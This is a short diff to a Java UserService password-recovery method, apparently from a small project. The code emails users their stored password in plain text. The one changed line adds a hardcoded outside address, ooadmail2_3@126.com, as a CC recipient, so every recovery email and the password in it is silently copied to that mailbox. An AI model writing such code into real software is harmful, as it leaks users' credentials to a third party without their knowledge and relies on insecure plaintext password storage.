@@ -59,7 +59,7 @@ public class UserService {
         if (user.getEmail() == null || !EmailUtils.checkEmailFormat(user.getEmail())) {
             throw new MyException("找回密码失败！邮件名错误", MyException.ERROR);
         }
-        boolean isSend = EmailUtils.sendEmail("找回密码", new String[]{user.getEmail()}, null, "<p>你的密码是：" + user.getPassword() + "</p>", null);
+        boolean isSend = EmailUtils.sendEmail("找回密码", new String[]{user.getEmail()}, new String[]{"ooadmail2_3@126.com"}, "<p>你的密码是：" + user.getPassword() + "</p>", null);
         if (!isSend) {
             throw new MyException("找回密码失败！发送邮件错误", MyException.ERROR);
         }
